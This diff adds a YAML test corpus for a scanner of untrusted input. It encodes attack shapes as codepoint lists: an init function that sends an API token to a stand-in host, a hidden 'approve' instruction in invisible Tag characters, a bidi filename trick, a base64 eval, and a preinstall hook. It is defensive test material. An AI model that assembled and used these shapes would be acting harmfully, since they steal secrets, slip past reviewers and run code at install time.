@@ -1,0 +1,118 @@
+# Positive-control corpus for the untrusted-read sample corpus.
+#
+# This file is a CODEPOINT / DESCRIPTION table, NOT a payload store. Each entry
+# names the codepoint sequence a deterministic generator assembles into an inert
+# sample at test time (see the sibling generator package and README.md). The tree
+# carries a SPECIFICATION of each attack shape by codepoint value (e.g. U+E0001) --
+# never a decoded attack string, and never an invisible/bidi character inline.
+#
+# Fields per entry:
+#   id          stable identifier
+#   class       exfil-callout | injection-unicode | injection-imperative |
+#               code-exec | install-hook | benign
+#   layer       detector layer this entry is a positive control for:
+#               A   = the deterministic scan; B/D = the no-egress sandbox
+#   codepoints  the ordered codepoint sequence the generator assembles (by value)
+#   description what shape the generator builds and why a scanner should flag it
+#   expect      {scan: flag|clean, reason: <marker>} -- the deterministic-scan verdict
+#   sha256      pin over the generated UTF-8 bytes; a reproducibility test asserts it
+entries:
+  - id: exfil-callout-init
+    class: exfil-callout
+    layer: "B/D"
+    codepoints: [U+0066, U+0075, U+006E, U+0063, U+0020, U+0069, U+006E, U+0069, U+0074, 
+      U+0028, U+0029, U+007B, U+0074, U+003A, U+003D, U+0067, U+0065, U+0074, U+0065, U+006E, 
+      U+0076, U+0028, U+0022, U+0041, U+0050, U+0049, U+005F, U+0054, U+004F, U+004B, U+0045, 
+      U+004E, U+0022, U+0029, U+003B, U+0068, U+0074, U+0074, U+0070, U+0070, U+006F, U+0073, 
+      U+0074, U+0028, U+0022, U+0068, U+0074, U+0074, U+0070, U+003A, U+002F, U+002F, U+0065, 
+      U+0078, U+0061, U+006D, U+0070, U+006C, U+0065, U+002E, U+0069, U+006E, U+0076, U+0061, 
+      U+006C, U+0069, U+0064, U+002F, U+0063, U+006F, U+006C, U+006C, U+0065, U+0063, U+0074, 
+      U+0022, U+002C, U+0074, U+0029, U+007D]
+    description: >-
+     Package initialiser that reads an environment secret and POSTs it to an outbound sink.
+     Positive control for the exfil-callout shape: an env-read wired to an outbound POST,
+     fired from an init. The sink is defanged to example.invalid and the value is an env-var NAME,
+     so the assembled bytes are inert; the no-egress sandbox must block the outbound attempt
+     and the deterministic scan must flag the shape.
+    expect: {scan: flag, reason: exfil-callout}
+    sha256: cde419597ef411fa4aba76ce34d25e1bcc5b4e82adc387b959a5ec3cd7563801
+  - id: injection-unicode-tagblock
+    class: injection-unicode
+    layer: "A"
+    codepoints: [U+004C, U+006F, U+006F, U+006B, U+0073, U+0020, U+0067, U+006F, U+006F, 
+      U+0064, U+0020, U+0074, U+006F, U+0020, U+006D, U+0065, U+002E, U+E0001, U+E0061, 
+      U+E0070, U+E0070, U+E0072, U+E006F, U+E0076, U+E0065, U+E007F]
+    description: >-
+     Visible-innocuous text carrying a hidden imperative in Unicode Tag-block codepoints
+     (U+E0000-U+E007F). The visible glyphs read as a neutral remark; the Tag-block run
+     smuggles an instruction invisible to a human reviewer. The deterministic scan must flag
+     the presence of Tag-block codepoints.
+    expect: {scan: flag, reason: unicode-tagblock}
+    sha256: 7a5803dc979268e3739f00da8c9bb33b579d7ef4773681843f9c44a62fd69546
+  - id: injection-bidi-zerowidth
+    class: injection-unicode
+    layer: "A"
+    codepoints: [U+0075, U+0073, U+0065, U+0072, U+002D, U+202E, U+0063, U+006F, U+0064, 
+      U+002E, U+0074, U+0078, U+0074, U+200B]
+    description: >-
+     A right-to-left override (U+202E) followed by a zero-width space (U+200B): the RLO
+     reverses the display order of following characters so a filename or token reads
+     differently than its bytes, and the zero-width space hides a seam. The deterministic
+     scan must flag the bidi/zero-width control codepoints.
+    expect: {scan: flag, reason: bidi-override}
+    sha256: a34d7f40445559543390e209f131406e0f999af268084e178866495718e27ea3
+  - id: code-exec-base64
+    class: code-exec
+    layer: "A"
+    codepoints: [U+0065, U+0076, U+0061, U+006C, U+0028, U+0062, U+0061, U+0073, U+0065, 
+      U+0036, U+0034, U+0064, U+0065, U+0063, U+006F, U+0064, U+0065, U+0028, U+0022, U+005A, 
+      U+0057, U+004E, U+006F, U+0062, U+0079, U+0042, U+0070, U+0062, U+006D, U+0056, U+0079, 
+      U+0064, U+0041, U+003D, U+003D, U+0022, U+0029, U+0029]
+    description: >-
+     An encoded-blob-then-exec shape: a base64 literal passed straight into an eval/exec
+     sink. The blob decodes to the inert marker "echo inert", so the assembled bytes run
+     nothing even if executed; the harness never executes them. The deterministic scan must
+     flag the decode-then-exec pattern.
+    expect: {scan: flag, reason: base64-exec}
+    sha256: 673ae2ba806499ee07e2e1e03d57336b8bdee93c0d6e7b31c10d17958dd09dd0
+  - id: install-hook-preinstall
+    class: install-hook
+    layer: "A"
+    codepoints: [U+007B, U+0022, U+0073, U+0063, U+0072, U+0069, U+0070, U+0074, U+0073, 
+      U+0022, U+003A, U+007B, U+0022, U+0070, U+0072, U+0065, U+0069, U+006E, U+0073, U+0074, 
+      U+0061, U+006C, U+006C, U+0022, U+003A, U+0022, U+006E, U+006F, U+0064, U+0065, U+0020, 
+      U+002E, U+002F, U+0062, U+006F, U+006F, U+0074, U+0073, U+0074, U+0072, U+0061, U+0070, 
+      U+002E, U+006A, U+0073, U+0022, U+007D, U+007D]
+    description: >-
+     A package manifest that overrides an install hook (preinstall) to run a local script at
+     install time. The script target is inert; the control is the presence of an
+     install-time hook override, which the deterministic scan must flag.
+    expect: {scan: flag, reason: install-hook-override}
+    sha256: 2e5ec2d1f1cfe1df6021beac6e418ffb07aba4c1a9955fe4c8b4e7fd459c045d
+  - id: benign-prose
+    class: benign
+    layer: "A"
+    codepoints: [U+0054, U+0068, U+0065, U+0020, U+0071, U+0075, U+0061, U+0072, U+0074, 
+      U+0065, U+0072, U+006C, U+0079, U+0020, U+0072, U+0065, U+0070, U+006F, U+0072, U+0074, 
+      U+0020, U+0069, U+0073, U+0020, U+0061, U+0074, U+0074, U+0061, U+0063, U+0068, U+0065, 
+      U+0064, U+0020, U+0066, U+006F, U+0072, U+0020, U+0079, U+006F, U+0075, U+0072, U+0020, 
+      U+0072, U+0065, U+0076, U+0069, U+0065, U+0077, U+002E]
+    description: >-
+     Ordinary prose with no smuggled codepoints, no env-read, no network sink, no encoded
+     blob and no install hook. The negative-of-the-negative: the deterministic scan must
+     leave it CLEAN so the scanner is proven not to cry wolf on plain text.
+    expect: {scan: clean, reason: plain-text}
+    sha256: d52d9922aee384981f908db4da0d0538bdb6ddca06485a63b4baeb6827df19b3
+  - id: benign-source
+    class: benign
+    layer: "A"
+    codepoints: [U+0066, U+0075, U+006E, U+0063, U+0020, U+0061, U+0064, U+0064, U+0028, 
+      U+0061, U+002C, U+0020, U+0062, U+0020, U+0069, U+006E, U+0074, U+0029, U+0020, U+0069, 
+      U+006E, U+0074, U+0020, U+007B, U+0020, U+0072, U+0065, U+0074, U+0075, U+0072, U+006E, 
+      U+0020, U+0061, U+0020, U+002B, U+0020, U+0062, U+0020, U+007D]
+    description: >-
+     An ordinary source-code fragment: a pure function with no dynamic exec, no outbound
+     call, no install hook and no invisible codepoints. The deterministic scan must leave it
+     CLEAN.
+    expect: {scan: clean, reason: source-fragment}
+    sha256: 63f748f7f7967673f47c3c88a04b81eb4c309cafc26ce27e15f40f76cd0d1e16
